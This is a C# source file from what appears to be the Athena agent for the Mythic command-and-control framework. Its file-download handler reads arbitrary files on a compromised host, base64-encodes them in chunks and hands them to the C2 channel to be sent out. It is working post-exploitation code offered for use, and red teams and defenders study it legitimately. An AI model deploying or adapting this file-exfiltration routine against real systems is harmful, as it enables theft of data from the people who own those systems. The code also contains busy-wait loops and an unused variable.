using Athena.Models.Mythic.Tasks;
using Athena.Utilities;
using System;
using System.IO;

namespace Athena.Commands
{
    public class FileHandler
    {
        public static bool downloadFile(MythicDownloadJob job)
        {
            if (!Globals.downloadJobs.ContainsKey(job.task.id))
            {
                Globals.downloadJobs.Add(job.task.id, job);
                MythicJob j = Globals.jobs[job.task.id];
                FileInfo fi = new FileInfo(job.path);
                job.total_chunks = GetTotalChunks(job.path, job.chunk_size);
                if (job.total_chunks == 0)
                {
                    j.errored = true;
                    j.taskresult = "An error occurred while attempting to access the file.";
                    j.hasoutput = true;
                    j.complete = true;
                }
                j.started = true;
                j.taskresult = "";
                j.hasoutput = true;
                while (string.IsNullOrEmpty(job.file_id))
                {
                    //Wait until initial request is sent out
                }
                if (job.total_chunks == 1)
                {
                    j.taskresult = Misc.Base64Encode(File.ReadAllBytes(job.path));
                    job.chunk_num = 1;
                    j.complete = true;
                    j.hasoutput = true;
                }
                else
                {
                    try
                    {
                        job.chunk_num = 1;
                        FileStream fileStream = new FileStream(job.path, FileMode.Open, FileAccess.Read);
                        using (fileStream)
                        {
                            byte[] buffer = new byte[job.chunk_size];
                            fileStream.Seek(0, SeekOrigin.Begin);
                            long totalBytes = 0;
                            int bytesRead = fileStream.Read(buffer, 0, job.chunk_size);
                            totalBytes += bytesRead;
                            byte[] testbuf = { buffer[0], buffer[1], buffer[2], buffer[3] };
                            j.taskresult = Misc.Base64Encode(buffer);
                            j.hasoutput = true;
                            while (j.taskresult != "")
                            {

                            }
                            job.chunk_num++;
                            while (bytesRead > 0)
                            {
                                if (fi.Length - totalBytes < job.chunk_size)
                                {
                                    buffer = new byte[fi.Length - totalBytes];
                                    bytesRead = fileStream.Read(buffer, 0, (int)(fi.Length - totalBytes));
                                    totalBytes += bytesRead;
                                    j.taskresult = Misc.Base64Encode(buffer);
                                    j.hasoutput = true;
                                }
                                else
                                {
                                    bytesRead = fileStream.Read(buffer, 0, job.chunk_size);
                                    testbuf = new byte[] { buffer[0], buffer[1], buffer[2], buffer[3] };
                                    j.taskresult = Misc.Base64Encode(buffer);
                                    j.hasoutput = true;
                                    totalBytes += bytesRead;
                                }
                                while (j.taskresult != "")
                                {

                                }
                                job.chunk_num++;
                            }
                            fileStream.Close();
                        }
                    }
                    catch (Exception e)
                    {
                        Misc.WriteError(e.Message);
                        j.complete = true;
                        j.errored = true;
                        j.hasoutput = true;
                        j.taskresult = e.Message;
                    }
                }
            }
            return true;
        }
        public static int GetTotalChunks(string File, int chunksize)
        {
            try
            {
                var fi = new FileInfo(File);
                int total_chunks = (int)(fi.Length + chunksize - 1) / chunksize;
                return total_chunks;
            }
            catch (Exception e)
            {
                Misc.WriteError(e.Message);
                return 0;
            }
        }
    }
}
